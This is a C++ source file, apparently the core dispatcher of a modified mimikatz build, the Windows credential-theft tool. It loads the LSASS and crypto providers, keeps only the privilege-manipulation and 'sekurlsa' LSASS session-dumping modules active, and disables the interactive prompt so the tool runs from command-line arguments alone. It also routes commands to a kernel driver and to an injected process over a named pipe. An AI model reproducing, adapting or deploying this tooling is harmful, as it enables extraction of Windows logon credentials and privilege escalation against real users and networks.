/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by-nc-sa/3.0/
*/
#include "mimikatz.h"

bool mimikatz::initLocalModules()
{
	mod_system::getVersion(&mod_system::GLOB_Version);
	mod_mimikatz_sekurlsa::loadLsaSrv();
	mod_cryptoapi::loadRsaEnh();

	// fixme
	//mesModules.push_back(KIWI_MIMIKATZ_LOCAL_MODULE(L"",			L"Standard", mod_mimikatz_standard::getMimiKatzCommands()));
	//mesModules.push_back(KIWI_MIMIKATZ_LOCAL_MODULE(L"crypto",		L"Cryptography and Certificates", mod_mimikatz_crypto::getMimiKatzCommands()));
	//mesModules.push_back(KIWI_MIMIKATZ_LOCAL_MODULE(L"hash",		L"Hash", mod_mimikatz_hash::getMimiKatzCommands()));
//	mesModules.push_back(KIWI_MIMIKATZ_LOCAL_MODULE(L"system",		L"Management System", mod_mimikatz_system::getMimiKatzCommands()));
//	mesModules.push_back(KIWI_MIMIKATZ_LOCAL_MODULE(L"process",		L"Handling Process", mod_mimikatz_process::getMimiKatzCommands()));
//	mesModules.push_back(KIWI_MIMIKATZ_LOCAL_MODULE(L"thread",		L"Handling Threads", mod_mimikatz_thread::getMimiKatzCommands()));
//	mesModules.push_back(KIWI_MIMIKATZ_LOCAL_MODULE(L"service",		L"Handling Services", mod_mimikatz_service::getMimiKatzCommands()));
	mesModules.push_back(KIWI_MIMIKATZ_LOCAL_MODULE(L"privilege",	L"Privilege Manipulation", mod_mimikatz_privilege::getMimiKatzCommands()));
//	mesModules.push_back(KIWI_MIMIKATZ_LOCAL_MODULE(L"handle",		L"Handle Manipulation", mod_mimikatz_handle::getMimiKatzCommands()));
//	mesModules.push_back(KIWI_MIMIKATZ_LOCAL_MODULE(L"impersonate",	L"Access Token Manipulation", mod_mimikatz_impersonate::getMimiKatzCommands()));
//	mesModules.push_back(KIWI_MIMIKATZ_LOCAL_MODULE(L"winmine",		L"Minesweeper Handles", mod_mimikatz_winmine::getMimiKatzCommands()));
//	mesModules.push_back(KIWI_MIMIKATZ_LOCAL_MODULE(L"minesweeper",	L"Manipulation of Minesweeper 7", mod_mimikatz_minesweeper::getMimiKatzCommands()));
//	mesModules.push_back(KIWI_MIMIKATZ_LOCAL_MODULE(L"nogpo",		L"Anti-GPO and Various Patches", mod_mimikatz_nogpo::getMimiKatzCommands()));
//	mesModules.push_back(KIWI_MIMIKATZ_LOCAL_MODULE(L"samdump",		L"SAM Dump", mod_mimikatz_samdump::getMimiKatzCommands()));
//	mesModules.push_back(KIWI_MIMIKATZ_LOCAL_MODULE(L"inject",		L"Injector Libraries", mod_mimikatz_inject::getMimiKatzCommands()));
//	mesModules.push_back(KIWI_MIMIKATZ_LOCAL_MODULE(L"ts",			L"Terminal Server", mod_mimikatz_terminalserver::getMimiKatzCommands()));
//	mesModules.push_back(KIWI_MIMIKATZ_LOCAL_MODULE(L"misc",		L"Miscellaneous Functions without their own Module", mod_mimikatz_divers::getMimiKatzCommands()));
	mesModules.push_back(KIWI_MIMIKATZ_LOCAL_MODULE(L"sekurlsa",	L"Dump current sessions LSASS", mod_mimikatz_sekurlsa::getMimiKatzCommands()));
//	mesModules.push_back(KIWI_MIMIKATZ_LOCAL_MODULE(L"efs",			L"EFS Manipulation", mod_mimikatz_efs::getMimiKatzCommands()));
	return true;
}

mimikatz::mimikatz(vector<wstring> * mesArguments) : Kmimikatz(NULL)
{
	initLocalModules();
	SetConsoleTitle(MIMIKATZ_FULL);

	// fixme
	bool mustContinue = true;
	if(mesArguments)
	{
		for(vector<wstring>::iterator maCommande = mesArguments->begin(); mustContinue && (maCommande != mesArguments->end()); maCommande++)
		{
			wstring commande = *maCommande;
//			wcout << endl << MIMIKATZ << L"(commandline) # " << dec << commande << endl;
			mustContinue = tryToDispatch(&commande);
		}
	}

	if ( 0 )//mustContinue)
	{
		wstring * monBuffer = new wstring();
		do
		{
			wcout << endl << MIMIKATZ << L" # " << dec;
			getline(wcin, *monBuffer);
		} while(tryToDispatch(monBuffer));
		delete monBuffer;
	}
	wcout.flush();
}

mimikatz::~mimikatz(void)
{
	mod_cryptoapi::unloadRsaEnh();
	mod_mimikatz_sekurlsa::unloadLsaSrv();
	mod_mimikatz_inject::closeThisCommunicator();
}

bool mimikatz::tryToDispatch(wstring * maLigne)
{
	bool reussite = false;

	if(!(reussite = maLigne->empty()))
	{
		switch(*(maLigne->begin()))
		{
		case L'@':	
		case L'*':	
			reussite = this->doCommandeDistante(maLigne->substr(1));
			break;
		case L'!':
//			reussite = this->doCommandeKernel(maLigne->substr(1));
			break;
		default:
			wstring fonction = *maLigne;
			vector<wstring> arguments;

			size_t monIndex = fonction.find(L' ');
			if(monIndex != wstring::npos)
			{
				fonction = fonction.substr(0, monIndex);
				arguments = mod_parseur::parse(maLigne->substr(monIndex + 1));
			}
			reussite = doCommandeLocale(&fonction, &arguments);
		}
	}

	return reussite;
}

bool mimikatz::doCommandeLocale(wstring * fonction, vector<wstring> * arguments)
{
	size_t monIndex = fonction->find(L"::");

	wstring module = L"";
	wstring commande = *fonction;

	if(monIndex != wstring::npos)
	{
		module = fonction->substr(0, monIndex);
		commande = fonction->substr(monIndex + 2);
	}

	for(vector<KIWI_MIMIKATZ_LOCAL_MODULE>::iterator monModule = mesModules.begin(); monModule != mesModules.end(); monModule++)
	{
		if(module == monModule->module)
		{
			for(vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND>::iterator maCommande = monModule->commandes.begin(); maCommande != monModule->commandes.end(); maCommande++)
			{
				if(commande == maCommande->commandName)
				{
					return maCommande->ptrCommand(arguments);
				}
			}

			if(module.empty()) wcout << L"Local Command \'" << commande << L"\' found" << endl; 
			else wcout << L"Module : \'" << module << L"\' identified command \'" << commande << L"\' found" << endl; 

			wcout << endl << L"Module Description : " << monModule->description << endl;
			listCommandes(monModule);

			return true;
		}
	}

	wcout << L"Module : \'" << module << L"\' found" << endl << endl << L"Modules available : " << endl;
	listModules();
	return true;
}

bool mimikatz::openKernel()
{
	bool reussite = false;

	if(!Kmimikatz || Kmimikatz == INVALID_HANDLE_VALUE)
	{
		wcout << L"Open the driver mimikatz : ";
		Kmimikatz = CreateFile(L"\\\\.\\mimikatz", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

		if(reussite = (Kmimikatz && Kmimikatz != INVALID_HANDLE_VALUE))
			wcout << L"OK";
		else
			wcout << L"CreateFile ; " << mod_system::getWinError();
		wcout << endl;
	}
	else
	{
		reussite = true;
	}

	return reussite;
}

bool mimikatz::closeKernel()
{
	bool reussite = false;
	if(Kmimikatz && Kmimikatz != INVALID_HANDLE_VALUE)
	{
		if(CloseHandle(Kmimikatz))
		{
			Kmimikatz = NULL;
			reussite = true;
		}
	}
	return reussite;
}

bool mimikatz::doCommandeKernel(std::wstring &commande)
{
	if(!commande.empty())
	{
		if(openKernel())
		{
			DWORD dwReturn;
			if(WriteFile(Kmimikatz, commande.c_str(), (commande.size() + 1) * sizeof(wchar_t), &dwReturn, NULL))
			{
				DWORD dwBuff = 0x40000;
				DWORD dwRead = 0;
				BYTE * buffer = new BYTE[dwBuff];
				RtlZeroMemory(buffer, dwBuff);
				if(ReadFile(Kmimikatz, buffer, dwBuff, &dwRead, NULL))
				{
					wcout << reinterpret_cast<wchar_t *>(buffer) << endl;
				}
				else wcout << L"ReadFile : " << mod_system::getWinError() << endl;

				delete[] buffer;
			}
			else wcout << L"WriteFile : " << mod_system::getWinError() << endl;
		}
		else wcout << L"Unable to communicate with the driver mimikatz";
	}
	else
	{
		wcout << L"Empty command (forced close) received" << endl;
		closeKernel();
	}

	return true;
}

bool mimikatz::doCommandeDistante(std::wstring &commande)
{
	bool commOk = false;

	if(mod_mimikatz_inject::monCommunicator)
	{
		if(!commande.empty())
		{
			if(mod_mimikatz_inject::monCommunicator->isConnected())
			{
				if(mod_mimikatz_inject::monCommunicator->writeToPipe(commande))
				{
					wstring buffer = L"";
					do
					{
						if(commOk = mod_mimikatz_inject::monCommunicator->readFromPipe(buffer))
						{
							wcout << buffer.substr(1) ;
						}
						else
						{
							wcout << L"Error : no response possible ; " << mod_system::getWinError() << endl;
							break;
						}
					} while(*(buffer.begin()) == L'#');
				}
				else wcout << L"Error : not writable ; " << mod_system::getWinError() << endl;
			}
		}
		else wcout << L"Empty command (forced disconnection) received" << endl;
	}
	else wcout << L"Error or no longer established communication" << endl;

	if(!commOk)
		mod_mimikatz_inject::closeThisCommunicator();

	return true;
}

void mimikatz::listModules()
{
	for(vector<KIWI_MIMIKATZ_LOCAL_MODULE>::iterator monModule = mesModules.begin(); monModule != mesModules.end(); monModule++)
	{
		wcout << setw(12) << setfill(wchar_t(' ')) << monModule->module << L"\t- " << monModule->description << endl;	
	}
}

void mimikatz::listCommandes(vector<KIWI_MIMIKATZ_LOCAL_MODULE>::iterator monModule)
{
	for(vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND>::iterator maCommande = monModule->commandes.begin(); maCommande != monModule->commandes.end(); maCommande++)
	{
		if(maCommande->commandName.front() != L':')
			wcout << setw(12) << setfill(wchar_t(' ')) << maCommande->commandName << L"\t- " << maCommande->commandHelp << endl;	
	}
}